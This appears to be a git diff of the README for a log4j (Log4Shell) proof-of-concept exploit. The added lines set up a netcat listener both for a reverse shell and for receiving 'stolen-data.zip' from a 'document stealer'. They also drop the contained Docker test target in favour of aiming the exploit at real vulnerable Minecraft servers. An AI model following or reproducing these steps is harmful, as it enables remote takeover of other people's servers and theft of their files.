@@ -18,7 +18,8 @@ pip install -r requirements.txt
 
 * Start a netcat listener to accept reverse shell connection.<br>
 ```py
-nc -lvnp 9001
+nc -lvnp 9001 # For remote shell
+nc -lvnp 9001 > stolen-data.zip # For document stealer
 ```
 * Launch the exploit.<br>
 **Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
@@ -44,12 +45,9 @@ This script will setup the HTTP server and the LDAP server for you, and it will 
 Vulnerable application
 --------------------------
 
-There is a Dockerfile with the vulnerable webapp. You can use this by following the steps below:
-```c
-1: docker build -t log4j-shell-poc .
-2: docker run --network host log4j-shell-poc
-```
-Once it is running, you can access it on localhost:8080
+Any java application that uses the vulnrable version of log4j would work, I use a Minecraft server, version 1.8-1.18.0 are all vulnrable. 
+
+Old versions of the server can be donwloaded in the official Minecraft launcher or at [MCVersions.net](http://www.mcversions.net)
 
 <br>
 
